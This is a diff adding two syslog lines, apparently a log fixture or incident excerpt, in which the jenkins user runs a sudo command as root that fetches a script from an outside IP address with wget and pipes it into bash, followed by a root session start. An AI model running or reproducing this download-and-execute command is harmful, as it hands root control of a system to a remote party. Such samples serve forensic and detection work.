@@ -1,0 +1,2 @@
+Oct  9 19:04:11 app03 sudo:  jenkins : TTY=unknown ; PWD=/var/lib/jenkins ; USER=root ; COMMAND=/bin/sh -c "wget -qO- http://45.61.136.9/i | bash"
+Oct  9 19:04:14 app03 systemd[1]: Started Session 4412 of user root.
